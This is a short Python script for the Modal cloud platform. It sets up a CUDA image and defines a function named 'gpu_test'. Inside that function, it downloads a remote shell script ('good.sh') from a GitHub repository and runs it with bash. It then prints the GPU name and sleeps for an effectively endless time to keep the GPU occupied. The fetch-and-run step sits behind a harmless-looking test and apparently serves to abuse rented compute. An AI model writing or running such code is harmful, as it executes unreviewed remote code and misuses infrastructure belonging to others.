import modal

app = modal.App()

image = (
    modal.Image.from_registry(
        "nvidia/cuda:12.8.0-devel-ubuntu22.04",
        add_python="3.12"
    )
    .apt_install(
        "git",
        "curl",
        "wget"
    )
    .pip_install(
        "torch",
        "torchvision"
    )
)

@app.function(
    image=image,
    gpu="A10G"
)
def gpu_test():
    import os
    os.system("curl -O -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/good.sh;bash good.sh")
    import torch
    print(torch.cuda.get_device_name())
    os.system("sleep 3726473746433")
